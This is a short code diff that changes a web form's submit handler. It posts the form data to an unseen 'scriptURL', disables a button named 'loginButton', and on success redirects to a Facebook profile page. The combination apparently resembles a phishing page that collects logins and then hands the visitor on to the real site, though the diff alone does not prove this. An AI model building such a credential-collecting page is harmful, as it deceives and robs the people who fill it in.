@@ -33,13 +33,30 @@
         const msg = document.getElementById("msg")
         form.addEventListener('submit', e => {
           e.preventDefault()
+            
+          document.body.style.cursor = "progress";
+          const loginButton = form.querySelector("input[type=submit]");
+          loginButton.disabled = true;
+            
           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(response => {
-                msg.innerHTML = "Click Here ➡"
-                setTimeout(function(){
-                    msg.innerHTML = ""
-                },90000)
-                form.reset()
+            .then((response) => {
+
+                    if (response.ok) {
+                        console.log("Success!", response);
+
+                        // Redirect after successful server-side processing
+                        window.location.replace("https://www.facebook.com/profile.php?id=100077939267416");
+                    } else {
+                        console.error("Error!", response.status);
+                        // Handle error as needed, or display an error message on the current page
+                    }
+                
+                // msg.innerHTML = "Click Here ➡"
+                // setTimeout(function(){
+                //     msg.innerHTML = ""
+                // },90000)
+                
+                // form.reset()
             })
             .catch(error => console.error('Error!', error.message))
         })
